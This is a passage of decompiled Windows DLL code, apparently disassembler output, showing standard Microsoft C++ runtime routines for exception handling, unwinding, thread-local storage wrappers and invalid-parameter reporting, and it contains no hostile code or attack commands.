    "           || (v8 = *(_DWORD *)a5 & 0x1FFFFFFF, v8 >= 0x19930521) && a5->pESTypeList",
    "           || v8 >= 0x19930522 && (a5->EHFlags & 4) != 0 )",
    "    {",
    "      if ( ExceptionRecord->ExceptionCode == -529697949",
    "        && ExceptionRecord->NumberParameters >= 3",
    "        && ExceptionRecord->params.magicNumber > 0x19930522 )",
    "      {",
    "        pForwardCompat = ExceptionRecord->params.pThrowInfo->pForwardCompat;",
    "        if ( pForwardCompat )",
    "          return ((int (__cdecl *)(struct EHExceptionRecord *, struct EHRegistrationNode *, void *, void *, struct _s_FuncInfo *, int, struct EHRegistrationNode *, _DWORD))pForwardCompat)(",
    "                   ExceptionRecord,",
    "                   a2,",
    "                   a3,",
    "                   a4,",
    "                   a5,",
    "                   a6,",
    "                   TargetFrame,",
    "                   a8);",
    "      }",
    "      FindHandler<__FrameHandler3>(ExceptionRecord, a2, a3, a4, a5, a8, a6, TargetFrame);",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl __InternalCxxFrameHandlerWrapper<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *TargetFrame,",
    "        unsigned __int8 a8)",
    "{",
    "  return __InternalCxxFrameHandler<__FrameHandler3>(ExceptionRecord, a2, a3, a4, a5, a6, TargetFrame, a8);",
    "}",
    "",
    "",
    "char *__thiscall sub_10018359(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::bad_exception::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10018374(_DWORD *this)",
    "{",
    "  _DWORD *result; // eax",
    "",
    "  this[1] = 0;",
    "  result = this;",
    "  this[2] = 0;",
    "  this[1] = \"bad exception\";",
    "  *this = &std::bad_exception::`vftable';",
    "  return result;",
    "}",
    "",
    "",
    "bool __thiscall type_info::operator==(void *this, int a2)",
    "{",
    "  return __std_type_info_compare((int)this + 4, a2 + 4) == 0;",
    "}",
    "",
    "",
    "void *__cdecl sub_100183AB(",
    "        _DWORD *a1,",
    "        struct EHRegistrationNode *a2,",
    "        int a3,",
    "        struct _s_FuncInfo *a4,",
    "        void *a5,",
    "        int a6,",
    "        unsigned int a7)",
    "{",
    "  void *v7; // ebx",
    "  int v9; // [esp+10h] [ebp-4Ch] BYREF",
    "  int v10; // [esp+18h] [ebp-44h]",
    "  int v11; // [esp+1Ch] [ebp-40h]",
    "  int v12; // [esp+20h] [ebp-3Ch]",
    "  int v13; // [esp+24h] [ebp-38h]",
    "  _DWORD *v14; // [esp+28h] [ebp-34h]",
    "  __ehstate_t state; // [esp+2Ch] [ebp-30h]",
    "  void *v16; // [esp+40h] [ebp-1Ch]",
    "  CPPEH_RECORD ms_exc; // [esp+44h] [ebp-18h]",
    "",
    "  v16 = a5;",
    "  v11 = 0;",
    "  state = a2[-1].state;",
    "  v14 = _CreateFrameInfo(&v9, a1[6]);",
    "  v13 = *(_DWORD *)(__vcrt_getptd() + 16);",
    "  v12 = *(_DWORD *)(__vcrt_getptd() + 20);",
    "  *(_DWORD *)(__vcrt_getptd() + 16) = a1;",
    "  *(_DWORD *)(__vcrt_getptd() + 20) = a3;",
    "  v10 = 1;",
    "  ms_exc.registration.TryLevel = 1;",
    "  v7 = _CallCatchBlock2(a2, a4, a5, a6, a7);",
    "  v16 = v7;",
    "  ms_exc.registration.TryLevel = -2;",
    "  v10 = 0;",
    "  a2[-1].state = state;",
    "  _FindAndUnlinkFrame((int)v14);",
    "  *(_DWORD *)(__vcrt_getptd() + 16) = v13;",
    "  *(_DWORD *)(__vcrt_getptd() + 20) = v12;",
    "  if ( *a1 == -529697949",
    "    && a1[4] == 3",
    "    && (a1[5] == 429065504 || a1[5] == 429065505 || a1[5] == 429065506)",
    "    && !v11",
    "    && v7",
    "    && _IsExceptionObjectToBeDestroyed(a1[6]) )",
    "  {",
    "    __DestructExceptionObject((int)a1);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "void __cdecl  CallUnexpected()",
    "{",
    "  if ( !*(_DWORD *)(__vcrt_getptd() + 28) )",
    "    unexpected();",
    "  abort();",
    "}",
    "",
    "",
    "int __cdecl ExFilterRethrow(struct _EXCEPTION_POINTERS *a1)",
    "{",
    "  PEXCEPTION_RECORD ExceptionRecord; // eax",
    "",
    "  ExceptionRecord = a1->ExceptionRecord;",
    "  if ( a1->ExceptionRecord->ExceptionCode != -529697949",
    "    || ExceptionRecord->NumberParameters != 3",
    "    || ExceptionRecord->ExceptionInformation[0] != 429065504",
    "    && ExceptionRecord->ExceptionInformation[0] != 429065505",
    "    && ExceptionRecord->ExceptionInformation[0] != 429065506",
    "    || ExceptionRecord->ExceptionInformation[2] )",
    "  {",
    "    return 0;",
    "  }",
    "  *(_DWORD *)(__vcrt_getptd() + 32) = 1;",
    "  return 1;",
    "}",
    "",
    "",
    "void __cdecl __FrameHandler3::FrameUnwindToEmptyState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3)",
    "{",
    "  __FrameHandler3::FrameUnwindToState(a1, a2, a3, -1);",
    "}",
    "",
    "",
    "void __cdecl __FrameHandler3::FrameUnwindToState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3,",
    "        int a4)",
    "{",
    "  __ehstate_t CurrentState; // esi",
    "  int v5; // eax",
    "  UnwindMapEntry *pUnwindMap; // eax",
    "  int v7; // eax",
    "  __ehstate_t toState; // [esp+10h] [ebp-20h]",
    "",
    "  CurrentState = __FrameHandler3::GetCurrentState(a1, a2, a3);",
    "  v5 = __vcrt_getptd();",
    "  ++*(_DWORD *)(v5 + 24);",
    "  while ( CurrentState != a4 )",
    "  {",
    "    if ( CurrentState <= -1 || CurrentState >= a3->maxState )",
    "      goto LABEL_14;",
    "    pUnwindMap = a3->pUnwindMap;",
    "    toState = pUnwindMap[CurrentState].toState;",
    "    if ( pUnwindMap[CurrentState].action )",
    "    {",
    "      __FrameHandler3::SetState(a1, a3, pUnwindMap[CurrentState].toState);",
    "      _CallSettingFrame(a3->pUnwindMap[CurrentState].action, a1, 259);",
    "    }",
    "    CurrentState = toState;",
    "  }",
    "  if ( *(int *)(__vcrt_getptd() + 24) > 0 )",
    "  {",
    "    v7 = __vcrt_getptd();",
    "    --*(_DWORD *)(v7 + 24);",
    "  }",
    "  if ( CurrentState != a4 )",
    "LABEL_14:",
    "    abort();",
    "  __FrameHandler3::SetState(a1, a3, CurrentState);",
    "}",
    "",
    "",
    "char __cdecl IsInExceptionSpec(struct EHExceptionRecord *a1, const struct _s_ESTypeList *a2)",
    "{",
    "  int nCount; // edi",
    "  char v3; // bl",
    "  int v4; // edx",
    "  CatchableTypeArray *pCatchableTypeArray; // eax",
    "  int nCatchableTypes; // ecx",
    "  int *arrayOfCatchableTypes; // eax",
    "  int *v8; // ecx",
    "  char *v9; // eax",
    "  int *v11; // [esp+Ch] [ebp-1Ch]",
    "  char *v12; // [esp+10h] [ebp-18h]",
    "  ThrowInfo *pThrowInfo; // [esp+14h] [ebp-14h]",
    "  int v14; // [esp+18h] [ebp-10h]",
    "  int *v15; // [esp+1Ch] [ebp-Ch]",
    "  int v16; // [esp+20h] [ebp-8h]",
    "  int v17; // [esp+24h] [ebp-4h]",
    "",
    "  if ( !a2 )",
    "    abort();",
    "  nCount = a2->nCount;",
    "  v3 = 0;",
    "  if ( a2->nCount > 0 )",
    "  {",
    "    v4 = 0;",
    "    v17 = 0;",
    "    pThrowInfo = a1->params.pThrowInfo;",
    "    pCatchableTypeArray = pThrowInfo->pCatchableTypeArray;",
    "    nCatchableTypes = pCatchableTypeArray->nCatchableTypes;",
    "    arrayOfCatchableTypes = (int *)pCatchableTypeArray->arrayOfCatchableTypes;",
    "    v14 = nCatchableTypes;",
    "    v11 = arrayOfCatchableTypes;",
    "    do",
    "    {",
    "      v8 = arrayOfCatchableTypes;",
    "      v15 = arrayOfCatchableTypes;",
    "      v16 = v14;",
    "      if ( v14 > 0 )",
    "      {",
    "        v9 = (char *)a2->pTypeArray + v4;",
    "        v12 = v9;",
    "        while ( !TypeMatchHelper<__FrameHandler3>((int)v9, *v8, pThrowInfo) )",
    "        {",
    "          v8 = v15 + 1;",
    "          --v16;",
    "          ++v15;",
    "          v9 = v12;",
    "          if ( v16 <= 0 )",
    "            goto LABEL_10;",
    "        }",
    "        v3 = 1;",
    "LABEL_10:",
    "        v4 = v17;",
    "      }",
    "      arrayOfCatchableTypes = v11;",
    "      v4 += 16;",
    "      v17 = v4;",
    "      --nCount;",
    "    }",
    "    while ( nCount );",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "void __stdcall _CallMemberFunction1(void *const a1, void (__thiscall *a2)(void *const, void *const), void *const a3)",
    "{",
    "  a2(a1, a3);",
    "}",
    "",
    "",
    "void __stdcall _CallMemberFunction2(",
    "        void *const a1,",
    "        void (__thiscall *a2)(void *const, void *const, int),",
    "        void *const a3,",
    "        int a4)",
    "{",
    "  a2(a1, a3, a4);",
    "}",
    "",
    "",
    "const struct _s_ESTypeList *__cdecl __FrameHandler3::getESTypes(const struct _s_FuncInfo *a1)",
    "{",
    "  return a1->pESTypeList;",
    "}",
    "",
    "",
    "int __stdcall _CallSettingFrame(int a1, int a2, int a3)",
    "{",
    "  void (*v3)(void); // eax",
    "  int v4; // ecx",
    "",
    "  v3 = (void (*)(void))sub_10018C90(a3);",
    "  v3();",
    "  v4 = a3;",
    "  if ( a3 == 256 )",
    "    v4 = 2;",
    "  return sub_10018C90(v4);",
    "}",
    "",
    "",
    "int (*__cdecl __except_validate_context_record(int a1))()",
    "{",
    "  int (*result)(); // eax",
    "  struct _TEB *v2; // ecx",
    "",
    "  result = __guard_check_icall_fptr;",
    "  if ( (char *)__guard_check_icall_fptr != (char *)nullsub_1 )",
    "  {",
    "    v2 = NtCurrentTeb();",
    "    result = *(int (**)())(a1 + 196);",
    "    if ( (PVOID)result < v2->NtTib.StackLimit || (PVOID)result > v2->NtTib.StackBase )",
    "      __fastfail(0xDu);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _local_unwind4(_DWORD *a1, int a2, unsigned int a3)",
    "{",
    "  int result; // eax",
    "  unsigned int v4; // esi",
    "  int v5; // esi",
    "  int v6; // ebx",
    "  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-28h]",
    "  int (__cdecl *v8)(int, int, int, int); // [esp-4h] [ebp-24h]",
    "",
    "  v8 = _unwind_handler4;",
    "  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;",
    "  while ( 1 )",
    "  {",
    "    result = a2;",
    "    v4 = *(_DWORD *)(a2 + 12);",
    "    if ( v4 == -2 || a3 != -2 && v4 <= a3 )",
    "      break;",
    "    v5 = 3 * v4;",
    "    v6 = (*a1 ^ *(_DWORD *)(a2 + 8)) + 4 * v5 + 16;",
    "    *(_DWORD *)(a2 + 12) = *(_DWORD *)((*a1 ^ *(_DWORD *)(a2 + 8)) + 4 * v5 + 0x10);",
    "    if ( !*(_DWORD *)(v6 + 4) )",
    "    {",
    "      _NLG_Notify(257);",
    "      sub_10018CC0(1, ExceptionList, v8);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _unwind_handler4(int a1, int a2, int a3, _DWORD *a4)",
    "{",
    "  int result; // eax",
    "",
    "  result = 1;",
    "  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )",
    "  {",
    "    _local_unwind4(*(_DWORD **)(a2 + 20), *(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 12));",
    "    *a4 = a2;",
    "    return 3;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __thiscall _EH4_CallFilterFunc(int (*this)(void))",
    "{",
    "  return this();",
    "}",
    "",
    "",
    "int __thiscall _EH4_TransferToHandler(int (__fastcall *this)(_DWORD, _DWORD))",
    "{",
    "  _NLG_Notify(1);",
    "  return this(0, 0);",
    "}",
    "",
    "",
    "void __fastcall _EH4_GlobalUnwind2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord)",
    "{",
    "  RtlUnwind(TargetFrame, &loc_10018995, ExceptionRecord, 0);",
    "}",
    "",
    "",
    "int __fastcall _EH4_LocalUnwind(int a1, unsigned int a2, int a3, _DWORD *a4)",
    "{",
    "  return _local_unwind4(a4, a1, a2);",
    "}",
    "",
    "",
    "char __vcrt_initialize_locks()",
    "{",
    "  struct _RTL_CRITICAL_SECTION *v0; // edi",
    "  unsigned int v1; // esi",
    "",
    "  v0 = &CriticalSection;",
    "  v1 = 0;",
    "  while ( __vcrt_InitializeCriticalSectionEx(v0, 0xFA0u, 0) )",
    "  {",
    "    ++dword_100401AC;",
    "    v1 += 24;",
    "    ++v0;",
    "    if ( v1 >= 0x18 )",
    "      return 1;",
    "  }",
    "  __vcrt_uninitialize_locks();",
    "  return 0;",
    "}",
    "",
    "",
    "char __vcrt_uninitialize_locks()",
    "{",
    "  int v0; // esi",
    "  struct _RTL_CRITICAL_SECTION *v1; // edi",
    "",
    "  v0 = dword_100401AC;",
    "  if ( dword_100401AC )",
    "  {",
    "    v1 = (struct _RTL_CRITICAL_SECTION *)((char *)&unk_1004017C + 24 * dword_100401AC);",
    "    do",
    "    {",
    "      DeleteCriticalSection(v1);",
    "      --dword_100401AC;",
    "      --v1;",
    "      --v0;",
    "    }",
    "    while ( v0 );",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "FARPROC __cdecl try_get_function(int a1, const CHAR *lpProcName, int *a3, int *a4)",
    "{",
    "  FARPROC result; // eax",
    "  HMODULE v6; // esi",
    "  HMODULE library_from_system_directory; // eax",
    "  volatile __int32 *v8; // ecx",
    "  volatile __int32 *v9; // [esp+4h] [ebp-8h]",
    "  int v10; // [esp+8h] [ebp-4h]",
    "",
    "  v9 = (volatile __int32 *)((char *)&unk_100401F8 + 4 * a1);",
    "  result = (FARPROC)*v9;",
    "  if ( *v9 == -1 )",
    "    return 0;",
    "  if ( !result )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      if ( a3 == a4 )",
    "        goto LABEL_12;",
    "      v10 = *a3;",
    "      v6 = (HMODULE)dword_100401EC[*a3];",
    "      if ( v6 )",
    "      {",
    "        if ( v6 != (HMODULE)-1 )",
    "          goto LABEL_16;",
    "      }",
    "      else",
    "      {",
    "        library_from_system_directory = try_load_library_from_system_directory((&lpLibFileName)[*a3]);",
    "        v6 = library_from_system_directory;",
    "        v8 = &dword_100401EC[v10];",
    "        if ( library_from_system_directory )",
    "        {",
    "          if ( _InterlockedExchange(v8, (__int32)library_from_system_directory) )",
    "            FreeLibrary(library_from_system_directory);",
    "LABEL_16:",
    "          result = GetProcAddress(v6, lpProcName);",
    "          if ( !result )",
    "          {",
    "LABEL_12:",
    "            _InterlockedExchange(v9, -1);",
    "            return 0;",
    "          }",
    "          _InterlockedExchange(v9, (__int32)result);",
    "          return result;",
    "        }",
    "        _InterlockedExchange(v8, -1);",
    "      }",
    "      ++a3;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "HINSTANCE __cdecl try_load_library_from_system_directory(LPCWSTR lpLibFileName)",
    "{",
    "  HINSTANCE result; // eax",
    "",
    "  result = LoadLibraryExW(lpLibFileName, 0, 0x800u);",
    "  if ( !result )",
    "  {",
    "    if ( GetLastError() != 87 || !wcsncmp(lpLibFileName, L\"api-ms-\", 7u) )",
    "      return 0;",
    "    else",
    "      return LoadLibraryExW(lpLibFileName, 0, 0);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "DWORD __cdecl __vcrt_FlsAlloc(int a1)",
    "{",
    "  FARPROC function; // eax",
    "",
    "  function = try_get_function(0, \"FlsAlloc\", (int *)&unk_10031AA8, (int *)\"FlsAlloc\");",
    "  if ( function )",
    "    return ((int (__thiscall *)(FARPROC, int))function)(function, a1);",
    "  else",
    "    return TlsAlloc();",
    "}",
    "",
    "",
    "int __cdecl __vcrt_FlsFree(DWORD dwTlsIndex)",
    "{",
    "  FARPROC function; // eax",
    "",
    "  function = try_get_function(1, \"FlsFree\", (int *)&unk_10031ABC, (int *)\"FlsFree\");",
    "  if ( function )",
    "    return ((int (__thiscall *)(FARPROC, DWORD))function)(function, dwTlsIndex);",
    "  else",
    "    return TlsFree(dwTlsIndex);",
    "}",
    "",
    "",
    "LPVOID __cdecl __vcrt_FlsGetValue(DWORD dwTlsIndex)",
    "{",
    "  FARPROC function; // eax",
    "",
    "  function = try_get_function(2, \"FlsGetValue\", (int *)&unk_10031ACC, (int *)\"FlsGetValue\");",
    "  if ( function )",
    "    return (LPVOID)((int (__thiscall *)(FARPROC, DWORD))function)(function, dwTlsIndex);",
    "  else",
    "    return TlsGetValue(dwTlsIndex);",
    "}",
    "",
    "",
    "int __cdecl __vcrt_FlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)",
    "{",
    "  FARPROC function; // eax",
    "",
    "  function = try_get_function(3, \"FlsSetValue\", (int *)&unk_10031AE0, (int *)\"FlsSetValue\");",
    "  if ( function )",
    "    return ((int (__thiscall *)(FARPROC, DWORD, LPVOID))function)(function, dwTlsIndex, lpTlsValue);",
    "  else",
    "    return TlsSetValue(dwTlsIndex, lpTlsValue);",
    "}",
    "",
    "",
    "int __cdecl __vcrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, int a3)",
    "{",
    "  FARPROC function; // eax",
    "",
    "  function = try_get_function(",
    "               4,",
    "               \"InitializeCriticalSectionEx\",",
    "               (int *)&unk_10031AF4,",
    "               (int *)\"InitializeCriticalSectionEx\");",
    "  if ( function )",
    "    return ((int (__thiscall *)(FARPROC, LPCRITICAL_SECTION, DWORD, int))function)(",
    "             function,",
    "             lpCriticalSection,",
    "             dwSpinCount,",
    "             a3);",
    "  else",
    "    return InitializeCriticalSectionAndSpinCount(lpCriticalSection, dwSpinCount);",
    "}",
    "",
    "",
    "void  unexpected()",
    "{",
    "  int v0; // eax",
    "  void (__thiscall *v1)(_DWORD); // esi",
    "",
    "  v0 = __vcrt_getptd();",
    "  v1 = *(void (__thiscall **)(_DWORD))(v0 + 4);",
    "  if ( v1 )",
    "    v1(*(_DWORD *)(v0 + 4));",
    "  terminate();",
    "}",
    "",
    "",
    "__ehstate_t __cdecl __FrameHandler3::GetCurrentState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3)",
    "{",
    "  if ( a3->maxState > 128 )",
    "    return a1->state;",
    "  else",
    "    return SLOBYTE(a1->state);",
    "}",
    "",
    "",
    "void __cdecl __FrameHandler3::SetState(struct EHRegistrationNode *a1, const struct _s_FuncInfo *a2, __ehstate_t a3)",
    "{",
    "  a1->state = a3;",
    "}",
    "",
    "",
    "void __stdcall sub_10018C90(int a1)",
    "{",
    "  JUMPOUT(0x10018CAB);",
    "}",
    "",
    "",
    "int __userpurge _NLG_Notify@<eax>(int result@<eax>, int a2@<ebp>, int a3)",
    "{",
    "  unk_1003F0D8 = a3;",
    "  unk_1003F0D4 = result;",
    "  unk_1003F0DC = a2;",
    "  return result;",
    "}",
    "",
    "",
    "int __usercall sub_10018CC0@<eax>(int (*a1)(void)@<eax>)",
    "{",
    "  return a1();",
    "}",
    "",
    "",
    "__crt_cached_ptd_host *__thiscall __crt_cached_ptd_host::__crt_cached_ptd_host(",
    "        __crt_cached_ptd_host *this,",
    "        struct __crt_locale_pointers *const a2)",
    "{",
    "  struct __crt_locale_data *locinfo; // eax",
    "  struct __crt_multibyte_data *mbcinfo; // ecx",
    "",
    "  *((_BYTE *)this + 20) = 0;",
    "  *(_DWORD *)this = 0;",
    "  *((_BYTE *)this + 8) = 0;",
    "  *((_BYTE *)this + 28) = 0;",
    "  *((_BYTE *)this + 36) = 0;",
    "  if ( a2 )",
    "  {",
    "    locinfo = a2->locinfo;",
    "    mbcinfo = a2->mbcinfo;",
    "LABEL_5:",
    "    *((_BYTE *)this + 20) = 1;",
    "    *((_DWORD *)this + 4) = mbcinfo;",
    "    *((_DWORD *)this + 3) = locinfo;",
    "    return this;",
    "  }",
    "  if ( !dword_10040364 )",
    "  {",
    "    locinfo = (struct __crt_locale_data *)off_1003F260;",
    "    mbcinfo = (struct __crt_multibyte_data *)off_1003F264;",
    "    goto LABEL_5;",
    "  }",
    "  return this;",
    "}",
    "",
    "",
    "void __thiscall __crt_cached_ptd_host::~__crt_cached_ptd_host(__crt_cached_ptd_host *this)",
    "{",
    "  int v2; // esi",
    "  int v3; // esi",
    "",
    "  if ( *((_BYTE *)this + 20) == 2 )",
    "    *(_DWORD *)(*(_DWORD *)this + 848) &= ~2u;",
    "  if ( *((_BYTE *)this + 28) )",
    "  {",
    "    v2 = *((_DWORD *)this + 6);",
    "    *(_DWORD *)(((int (*)(void))unknown_libname_7)() + 16) = v2;",
    "  }",
    "  if ( *((_BYTE *)this + 36) )",
    "  {",
    "    v3 = *((_DWORD *)this + 8);",
    "    *(_DWORD *)(unknown_libname_7(this) + 20) = v3;",
    "  }",
    "}",
    "",
    "",
    "unsigned int __thiscall __crt_cached_ptd_host::check_synchronize_global_state_index(__crt_cached_ptd_host *this)",
    "{",
    "  DWORD LastError; // eax",
    "",
    "  if ( *((_BYTE *)this + 8) )",
    "    return *((_DWORD *)this + 1);",
    "  LastError = GetLastError();",
    "  *((_DWORD *)this + 1) = 0;",
    "  *((_BYTE *)this + 8) = 1;",
    "  SetLastError(LastError);",
    "  return 0;",
    "}",
    "",
    "",
    "struct __acrt_ptd *__thiscall __crt_cached_ptd_host::force_synchronize_per_thread_data(__crt_cached_ptd_host *this)",
    "{",
    "  DWORD LastError; // eax",
    "  bool v3; // zf",
    "  int v4; // eax",
    "  int v5; // eax",
    "  int v6; // esi",
    "  DWORD v8; // [esp-4h] [ebp-10h]",
    "  DWORD dwErrCode; // [esp+8h] [ebp-4h] BYREF",
    "",
    "  LastError = GetLastError();",
    "  v3 = *((_BYTE *)this + 8) == 0;",
    "  dwErrCode = LastError;",
    "  if ( v3 )",
    "  {",
    "    v4 = 0;",
    "    *((_BYTE *)this + 8) = 1;",
    "    *((_DWORD *)this + 1) = 0;",
    "  }",
    "  else",
    "  {",
    "    v4 = *((_DWORD *)this + 1);",
    "  }",
    "  v5 = sub_10020089(&dwErrCode, v4);",
    "  v8 = dwErrCode;",
    "  v6 = v5;",
    "  *(_DWORD *)this = v5;",
    "  SetLastError(v8);",
    "  return (struct __acrt_ptd *)v6;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_7(__crt_cached_ptd_host *this)",
    "{",
    "}void __usercall __acrt_call_reportfault(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4, int a5, int a6)",
    "{",
    "  int v6; // ecx",
    "  int v7; // edx",
    "  unsigned int v8; // kr00_4",
    "  BOOL v9; // edi",
    "  struct _EXCEPTION_POINTERS ExceptionInfo; // [esp+4h] [ebp-328h] BYREF",
    "  _DWORD v11[20]; // [esp+Ch] [ebp-320h] BYREF",
    "  _DWORD v12[179]; // [esp+5Ch] [ebp-2D0h] BYREF",
    "  int savedregs; // [esp+32Ch] [ebp+0h]",
    "  _UNKNOWN *retaddr; // [esp+330h] [ebp+4h] BYREF",
    "",
    "  if ( a4 != -1 )",
    "    sub_100163FC();",
    "  memset(v11, 0, sizeof(v11));",
    "  memset(v12, 0, sizeof(v12));",
    "  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v11;",
    "  ExceptionInfo.ContextRecord = (PCONTEXT)v12;",
    "  v12[44] = v12;",
    "  v12[43] = v6;",
    "  v12[42] = v7;",
    "  v12[41] = a1;",
    "  v12[40] = a3;",
    "  v12[39] = a2;",
    "  LOWORD(v12[50]) = __SS__;",
    "  LOWORD(v12[47]) = __CS__;",
    "  LOWORD(v12[38]) = __DS__;",
    "  LOWORD(v12[37]) = __ES__;",
    "  LOWORD(v12[36]) = __FS__;",
    "  LOWORD(v12[35]) = __GS__;",
    "  v8 = __readeflags();",
    "  v12[48] = v8;",
    "  v12[46] = retaddr;",
    "  v12[49] = &retaddr;",
    "  v12[0] = 65537;",
    "  v12[45] = savedregs;",
    "  v11[0] = a5;",
    "  v11[1] = a6;",
    "  v11[3] = retaddr;",
    "  v9 = IsDebuggerPresent();",
    "  SetUnhandledExceptionFilter(0);",
    "  if ( !UnhandledExceptionFilter(&ExceptionInfo) && !v9 && a4 != -1 )",
    "    sub_100163FC();",
    "}",
    "",
    "",
    "int __cdecl sub_10018F0C(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = a1;",
    "  dword_10040210 = a1;",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl _invalid_parameter(",
    "        wchar_t *Expression,",
    "        wchar_t *FunctionName,",
    "        wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved)",
    "{",
    "  _BYTE v5[40]; // [esp+0h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v5, 0);",
    "  _invalid_parameter_internal(Expression, FunctionName, FileName, LineNo, Reserved, (__crt_cached_ptd_host *)v5);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v5);",
    "}",
    "",
    "",
    "int __cdecl _invalid_parameter_internal(",
    "        wchar_t *Expression,",
    "        wchar_t *FunctionName,",
    "        wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved,",
    "        struct __acrt_ptd **a6)",
    "{",
    "  struct __acrt_ptd *v6; // eax",
    "  int (__cdecl *v7)(wchar_t *, wchar_t *, wchar_t *, unsigned int, uintptr_t); // esi",
    "  wchar_t *v9; // [esp-14h] [ebp-1Ch]",
    "  wchar_t *v10; // [esp-10h] [ebp-18h]",
    "  wchar_t *v11; // [esp-Ch] [ebp-14h]",
    "  unsigned int v12; // [esp-8h] [ebp-10h]",
    "  uintptr_t v13; // [esp-4h] [ebp-Ch]",
    "",
    "  v6 = *a6;",
    "  if ( (*a6 || (v6 = __crt_cached_ptd_host::force_synchronize_per_thread_data((__crt_cached_ptd_host *)a6)) != 0)",
    "    && (v7 = (int (__cdecl *)(wchar_t *, wchar_t *, wchar_t *, unsigned int, uintptr_t))*((_DWORD *)v6 + 215)) != 0 )",
    "  {",
    "    v13 = Reserved;",
    "    v12 = LineNo;",
    "    v11 = FileName;",
    "    v10 = FunctionName;",
    "    v9 = Expression;",
    "  }",
    "  else",
    "  {",
    "    v13 = Reserved;",
    "    v12 = LineNo;",
    "    v11 = FileName;",
    "    v10 = FunctionName;",
    "    v7 = (int (__cdecl *)(wchar_t *, wchar_t *, wchar_t *, unsigned int, uintptr_t))__ROR4__(",
    "                                                                                      __security_cookie",
    "                                                                                    ^ dword_10040210[__crt_cached_ptd_host::check_synchronize_global_state_index((__crt_cached_ptd_host *)a6)],",
    "                                                                                      __security_cookie & 0x1F);",
    "    v9 = Expression;",
    "    if ( !v7 )",
    "      _invoke_watson(Expression, FunctionName, FileName, LineNo, Reserved);",
    "  }",
    "  return v7(v9, v10, v11, v12, v13);",
    "}",
    "",
    "",
    "void __cdecl _invalid_parameter_noinfo()",
    "{",
    "  _invalid_parameter(0, 0, 0, 0, 0);",
    "}",
    "",
    "",
    "void __cdecl  _invalid_parameter_noinfo_noreturn()",
    "{",
    "  _invalid_parameter(0, 0, 0, 0, 0);",
    "  _invoke_watson(0, 0, 0, 0, 0);",
    "}",
    "",
    "",
    "void __cdecl  _invoke_watson(",
    "        const wchar_t *Expression,",
    "        const wchar_t *FunctionName,",
    "        const wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved)",
    "{",
    "  int v5; // ebx",
    "  int v6; // edi",
    "  HANDLE CurrentProcess; // eax",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(5u);",
    "  __acrt_call_reportfault(v5, v6, -1073740777, 2, -1073740777, 1);",
    "  CurrentProcess = GetCurrentProcess();",
    "  TerminateProcess(CurrentProcess, 0xC0000417);",
    "}",
    "",
    "",
    "int __cdecl __acrt_locale_get_ctype_array_value(",
    "        const unsigned __int16 *const Locale_pctype_array,",
    "        const int Char_value,",
    "        const int Mask)",
    "{",
    "  if ( (unsigned int)(Char_value + 1) > 0x100 )",
    "    return 0;",
    "  else",
    "    return (unsigned __int16)Mask & Locale_pctype_array[Char_value];",
    "}",
    "",
    "",
    "int __cdecl common_vsprintf<__crt_stdio_output::standard_base,char>(",
    "        int a1,",
    "        int a2,",
    "        _DWORD *a3,",
    "        unsigned int a4,",
    "        int a5,",
    "        __crt_cached_ptd_host *a6,",
    "        int a7)",
    "{",
    "  _BYTE *v8; // edi",
    "  int v9; // eax",
    "  int v10; // eax",
    "  int v11; // esi",
    "  _DWORD v12[2]; // [esp+Ch] [ebp-470h] BYREF",
    "  int v13; // [esp+14h] [ebp-468h]",
    "  int v14; // [esp+18h] [ebp-464h]",
    "  _DWORD *v15; // [esp+1Ch] [ebp-460h] BYREF",
    "  _BYTE v16[60]; // [esp+20h] [ebp-45Ch] BYREF",
    "  _BYTE v17[1044]; // [esp+5Ch] [ebp-420h] BYREF",
    "  int v18; // [esp+470h] [ebp-Ch]",
    "",
    "  v15 = a3;",
    "  if ( !a5 || a4 && !a3 )",
    "  {",
    "    *((_BYTE *)a6 + 28) = 1;",
    "    *((_DWORD *)a6 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a6);",
